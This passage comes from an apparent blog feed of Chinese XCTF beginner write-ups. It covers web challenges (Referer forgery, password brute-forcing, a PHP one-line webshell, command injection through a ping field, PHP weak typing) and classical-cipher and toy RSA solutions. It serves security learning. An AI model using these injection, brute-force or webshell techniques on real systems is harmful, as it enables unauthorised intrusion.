src="/2019/11/11/XCTF-adworld-web-wp/8_1.jpg"></p><p>百度Refer可知</p><blockquote><p>HTTP_REFERER提供了引导用户代理到当前页的前一页的地址信息，常见的一些应用场景有防盗链，统计文章有多少次是来自谷歌搜索结果，多少次来自百度搜索结果等。 </p></blockquote><blockquote><ul><li>什么时候获取不到HTTP_REFERER值</li></ul><p>综上所述，HTTP_REFERER存在需要两个条件：</p><p>浏览器（客户端）请求（服务器端请求的情况下，是不存在HTTP_REFERER的，但是可以伪造header，这在下一节中将提及）；<br>存在前导页；</p><p>​    以下是一些获取不到HTTP_REFERER值的情况：</p><ul><li><p>在浏览器内直接敲URL</p></li><li><p>windows桌面上的超链接图标</p></li><li><p>浏览器内书签</p></li><li><p>第三方软件（如Word，Excel等）内容中的链接</p></li><li><p>SSL认证网站跳入</p></li><li><p>&lt; <a href="http://example.com/“&gt;" target="_blank" rel="noopener">http://example.com/“&gt;</a> meta页面设置自动跳转时，在example.com将取不到REFERER URL</p></li><li><p>使用JavaScript的Location.href或者是Location.replace()</p></li></ul><p>  在以下情况下可以获取HTTP_REFERER值：</p><ul><li><p>直接用form提交的表单(POST或GET)</p></li><li><p>src请求（如js的script标签及html中img标签的src属性）</p></li></ul></blockquote><p>直接伪造header的<code>Referer</code>属性</p><p>但是没有得到结果</p><p><img src="/2019/11/11/XCTF-adworld-web-wp/8_2.jpg" alt></p><p>后面百度发现，<code>url/xxx</code>和<code>url/xxx/</code>是不一样的，<code>url/xxx</code>是直接访问xxx的文件，而<code>url/xxx/</code>是访问xxx目录，因此我们刚才得不到flag，将Referer的后面的斜杠去掉，再次请求，得到flag</p><p><img src="/2019/11/11/XCTF-adworld-web-wp/8_3.jpg" alt></p><h2 id="0x09-weak-auth"><a href="#0x09-weak-auth" class="headerlink" title="0x09  weak_auth"></a>0x09  weak_auth</h2><blockquote><p> 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 </p></blockquote><p>直接点login跳转到了check.php，提示：please login as admin</p><p>用admin空密码去登陆，显示：password error</p><p>点确认，F12查看源码<code>&lt;script&gt;alert(&#39;password error&#39;);&lt;/script&gt;&lt;!--maybe you need a dictionary--&gt;</code>提示可能需要一个字典，肯定是<strong>爆破</strong>了</p><p>因此，我去学习了BurpSuite的Intruder功能——用于爆破的一个工具。</p><p>关于Burp Suite 的Intruder模块的四种选项的解释 <a href="https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/" target="_blank" rel="noopener">https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/</a> </p><p>关于BurpSuite的Intruder模块的解释： <a href="https://www.cnblogs.com/yufusec/p/9179625.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufusec/p/9179625.html</a> </p><p>然后爆破得到密码123456，进入系统得到flag</p><h2 id="0x0a-webshell"><a href="#0x0a-webshell" class="headerlink" title="0x0a webshell"></a>0x0a webshell</h2><blockquote><p> 题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 </p></blockquote><p><img src="/2019/11/11/XCTF-adworld-web-wp/10.jpg" alt></p><blockquote><p> webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将 其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服 务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 顾名思义，”web”的含义是显然需要服务器开放web服务，”shell”的含义是取得对服务器某 种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操 作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 首先新建一个index.php文件，把PHP代码输入到里面，电脑可能会自动识别它为病毒，并 删除，可以恢复后使用  </p></blockquote><p>正如题目提示：php一句话——即<strong>php一句话木马</strong>： <a href="https://my.oschina.net/programs/blog/1649544" target="_blank" rel="noopener">https://my.oschina.net/programs/blog/1649544</a> </p><p>了解之后，想用burpsuite的post请求发送也没能获取数据，于是看了wp，用中国蚁剑连了webshell，然后直接发现目录底下就有flag.txt。</p><p><del>做完之后，查看官方wp，我也没弄懂他wp怎么用burpsuite去post数据来获取webshell（我回显不了数据</del></p><p>update：post没有回显是因为我少了分号，还有就是hackbar的post没有发出去。后面成功用burpsuite发送post请求，成功执行命令。</p><h2 id="0x0b-command-execution"><a href="#0x0b-command-execution" class="headerlink" title="0x0b command execution"></a>0x0b command execution</h2><blockquote><p> 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 </p></blockquote><p>进入页面有个输入框，尝试输入127.0.0.1发现能够ping通并显示命令</p><p>于是联想到<strong>命令拼接</strong>利用&amp;或|或；让我们的命令和ping一起执行，发现flag在<code>/home/flag.txt</code>里</p><p>用find命令的时候，不知道为什么在他的shell里搜索的时候要带引号，即<code>find / -name &quot;flag*&quot;</code>才能成功执行命令回显，去掉引号即失败了。</p><h2 id="0x0c-simple-php"><a href="#0x0c-simple-php" class="headerlink" title="0x0c simple php"></a>0x0c simple php</h2><blockquote><p> 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进入页面，见到如上php代码，应该是<strong>代码审计</strong>。</p><p>即让a满足<code>$a==0 and $a</code>且b满足<code>is_numeric($b)==flase&amp;$b&gt;1234</code>得到两个flag</p><blockquote><p> php中的弱类型比较会使’abc’ == 0为真，所以输入a=abc时，可得到flag1。（abc可换成任意字符）。 </p></blockquote><blockquote><p> is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真，所以当输入a=abc&amp;b=1235a，可得到flag2。</p></blockquote><blockquote><p> 发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的 形式 数字和字符混合的字符串转换为整数后只保留数字 </p></blockquote><p><img src="/2019/11/11/XCTF-adworld-web-wp/12.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-adworld-crypto-wp</title>
      <link href="/2019/11/10/XCTF-adworld-crypto-wp/"/>
      <url>/2019/11/10/XCTF-adworld-crypto-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto-amp-WriteUp"><a href="#Crypto-amp-WriteUp" class="headerlink" title="Crypto&amp;WriteUp"></a><center>Crypto&amp;WriteUp</center></h1><p>crypto永远充满了google和常识（还有工具</p><h1 id="攻防世界-amp-Crypto新手练习区"><a href="#攻防世界-amp-Crypto新手练习区" class="headerlink" title="攻防世界&amp;Crypto新手练习区"></a><center>攻防世界&amp;Crypto新手练习区</center></h1><h2 id="0x01-幂数加密"><a href="#0x01-幂数加密" class="headerlink" title="0x01 幂数加密"></a>0x01 幂数加密</h2><blockquote><p>  题目描述：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母} </p></blockquote><p>下载附件打开查看是txt，里面放一段数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8842101220480224404014224202480122</span><br></pre></td></tr></table></figure><p>由ctf-wiki的常识可知，这是01248加密，即以0为分割，将其中的数加起来对应字母表的排位。</p><p>解得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01248：</span><br><span class="line">23 5 12 12 4 15 14 5</span><br><span class="line">w  e l  l  d o  n  e</span><br></pre></td></tr></table></figure><h2 id="0x02-base64"><a href="#0x02-base64" class="headerlink" title="0x02 base64"></a>0x02 base64</h2><blockquote><p>题目描述：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。 </p></blockquote><p>打开附件是一段英文，有题目得知是base64编码，解码得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</span><br><span class="line">cyberpeace&#123;Welcome_to_new_World!&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-Caesar"><a href="#0x03-Caesar" class="headerlink" title="0x03 Caesar"></a>0x03 Caesar</h2><blockquote><p>题目描述：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p></blockquote><p>由题目得知是凯撒密码，随便百度一个工具进行暴力破解得知，移位12位</p><p>快捷：算出o和c得插值，但是我觉得更慢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span><br><span class="line">cyberpeace&#123;you_have_learned_caesar_encryption&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-Morse"><a href="#0x04-Morse" class="headerlink" title="0x04 Morse"></a>0x04 Morse</h2><blockquote><p> 题目描述：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写) </p></blockquote><p>下载附件，打开文档是一串01串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</span><br></pre></td></tr></table></figure><p>假如按<code>1:=.&amp;0:=-</code>翻译则第一个字母可翻译，但是后面有一个字符无法翻译</p><p>因此，01调换顺序<code>1:=-&amp;0:=.</code></p><p>利用python的str.replace的到<code>.-</code>的morsecode，找个在线工具直接翻译得到结果，需要自己加上cyberpeace{}格式：<code>cyberpeace{morsecodeissointeresting}</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">morsecodeissointeresting</span><br></pre></td></tr></table></figure><p>可惜我后来没注意到需要全部小写，浪费了时间。</p><h2 id="0x05-Railfence"><a href="#0x05-Railfence" class="headerlink" title="0x05 Railfence"></a>0x05 Railfence</h2><blockquote><p> 题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。 </p></blockquote><p>打开附件是一个文档如下，如题目明显的是栅栏加密。找了个在线工具破解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br></pre></td></tr></table></figure><p>结果常规栅栏加密没跑出来，在看到题目有一个数字5盲猜这可能是栅栏加密的key，但是常规的是跑不出来flag的，后面看百科知道有个是www型栅栏加密</p><p><strong>PS:WWW型的加密密钥就不只能是字符串长度的因子，小于其长度的任何一个数都可能是其key值，所以第一步也是确定密钥。</strong></p><p>由题目可知key可能是5，一尝试果然正确，得到flag：<code>cyberpeace{railfence_cipher_gogogo}</code></p><p>附一个www型栅栏密码的网站： <a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=777</a> </p><p>附赠一个栅栏密码的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#常见的栅栏解密</span></span><br><span class="line"></span><br><span class="line">e = input(<span class="string">'清输入要解密的字符串\n'</span>)</span><br><span class="line">elen = len(e)  <span class="comment"># 计算字符串长度</span></span><br><span class="line">field = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, elen):  <span class="comment"># 做一个循环，从2开始到数字elen（字符串长度）</span></span><br><span class="line">    <span class="keyword">if</span> elen % i == <span class="number">0</span>:  <span class="comment"># 计算那些数字能整除字符串长度</span></span><br><span class="line">        field.append(i)  <span class="comment"># 将能整出的数字加入到field里面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</span><br><span class="line">    b = elen // f  <span class="comment"># 用字符串实际长度除以上面计算出能整出的数字f</span></span><br><span class="line">    result = &#123;x: <span class="string">''</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):  <span class="comment"># 字符串有多少位，就循环多少次</span></span><br><span class="line">        a = i % b</span><br><span class="line">        result.update(&#123;a: result[a] + e[i]&#125;)  <span class="comment"># 字符串截断，并更新数据</span></span><br><span class="line">    d = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</span><br><span class="line">        d += result[i]</span><br><span class="line">    print(<span class="string">'分为'</span>+str(f)+<span class="string">'栏时，解密结果为：'</span>+d+<span class="string">'\n'</span>)  <span class="comment"># 输出结果，并开始下一个循环</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#W型加密</span></span><br><span class="line"></span><br><span class="line">string=input(<span class="string">"输入要加密的字符串\n"</span>)</span><br><span class="line">length = len(string)</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜想不会是一栏,和n栏（滑稽）因为这个就是原来字符串（狗头）</span></span><br><span class="line"><span class="comment">#那么，就暴力遍历一波其中的那些⑧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,length):</span><br><span class="line">    result=&#123;x:<span class="string">""</span><span class="keyword">for</span> x <span class="keyword">in</span> range(i)&#125;  </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(length) :</span><br><span class="line">        width=i*<span class="number">2</span><span class="number">-2</span></span><br><span class="line">        num=a%width</span><br><span class="line">        <span class="keyword">if</span>(num&lt;i):</span><br><span class="line">            result.update(&#123;num:result[num]+string[a]&#125;)           </span><br><span class="line">        <span class="keyword">else</span>:         </span><br><span class="line">            ll=<span class="number">2</span>*i<span class="number">-2</span>-num</span><br><span class="line">            result.update(&#123;ll:result[ll]+string[a]&#125;)               </span><br><span class="line">    d=<span class="string">''</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(i):</span><br><span class="line">        d=d+result[k]</span><br><span class="line">    print(<span class="string">"分为"</span>+str(i)+<span class="string">"栏,结果是："</span>+d)</span><br></pre></td></tr></table></figure><h2 id="0x06-转轮机加密"><a href="#0x06-转轮机加密" class="headerlink" title="0x06 转轮机加密"></a>0x06 转轮机加密</h2><blockquote><p> 题目描述：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊 </p></blockquote><p>看题目可知是转轮机算法</p><p>附件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:   &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2:   &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3:   &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4:   &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5:   &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6:   &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7:   &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8:   &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9:   &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line">10:  &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line">11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line">12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line">13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为： 2,3,7,5,13,12,9,1,8,10,4,11,6</span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure><p>//TODO：还需要搞清楚转轮机算法的原理，有点混乱现在</p><p>官方wp给出以下python自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">sss=<span class="string">'''1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">m=<span class="string">"NFQKSEVOQOFNP"</span></span><br><span class="line">content=re.findall(<span class="string">r'&lt; (.*?) &lt;'</span>,sss,re.S)</span><br><span class="line">iv=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span>]</span><br><span class="line">vvv=[]</span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">   index=content[iv[i]<span class="number">-1</span>].index(m[i])</span><br><span class="line">   vvv.append(index)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">   flag=<span class="string">""</span></span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">       flag+=content[iv[j]<span class="number">-1</span>][(vvv[j]+i)%<span class="number">26</span>]</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><h2 id="0x07-easy-RSA"><a href="#0x07-easy-RSA" class="headerlink" title="0x07 easy RSA"></a>0x07 easy RSA</h2><p>打开附件查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</span><br><span class="line">求解出d</span><br><span class="line">fi=(p-1)(q-1)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e*d=1 mod fi</span><br><span class="line">d=e^(fi(fi)-1)</span><br></pre></td></tr></table></figure><p>感谢舍友的cpp文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="function">ll  <span class="title">gcd</span><span class="params">(ll a,ll b,ll&amp;aa,ll&amp;bb)</span></span>&#123;</span><br><span class="line">ll ab=<span class="number">0</span>,ba=<span class="number">0</span>;aa=<span class="number">1</span>;bb=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">0</span>)&#123;aa=ba;<span class="keyword">return</span> b;&#125;</span><br><span class="line">ba-=(b/a)*aa;bb-=(b/a)*ab;b%=a;</span><br><span class="line"><span class="keyword">if</span>(b==<span class="number">0</span>)&#123;bb=ab;<span class="keyword">return</span> a;&#125;</span><br><span class="line">aa-=(a/b)*ba;ab-=(a/b)*bb;a%=b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">mod_inverse</span><span class="params">(ll a,ll mod)</span></span>&#123;</span><br><span class="line">ll res,temp;</span><br><span class="line">ll d=gcd(a,mod,res,temp);</span><br><span class="line"><span class="keyword">if</span>(d==<span class="number">1</span>)<span class="keyword">return</span> res;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ll p,q,e,d;</span><br><span class="line">p = <span class="number">473398607161</span>;</span><br><span class="line">q = <span class="number">4511491</span>;</span><br><span class="line">e = <span class="number">17</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;mod_inverse(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据舍友给的rsa的cpp文件改出的python脚本，不会爆longlong哦（虽然原题也不会爆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EX_GCD</span><span class="params">(a,b,arr)</span>:</span> <span class="comment">#扩展欧几里得</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    g = EX_GCD(b, a % b, arr)</span><br><span class="line">    t = arr[<span class="number">0</span>]</span><br><span class="line">    arr[<span class="number">0</span>] = arr[<span class="number">1</span>]</span><br><span class="line">    arr[<span class="number">1</span>] = t - int(a / b) * arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ModReverse</span><span class="params">(a,n)</span>:</span> <span class="comment">#ax=1(mod n) 求a模n的乘法逆x</span></span><br><span class="line">    arr = [<span class="number">0</span>,<span class="number">1</span>,]</span><br><span class="line">    gcd = EX_GCD(a,n,arr)</span><br><span class="line">    <span class="keyword">if</span> gcd == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (arr[<span class="number">0</span>] % n + n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">a,b = eval(input())</span></span><br><span class="line"><span 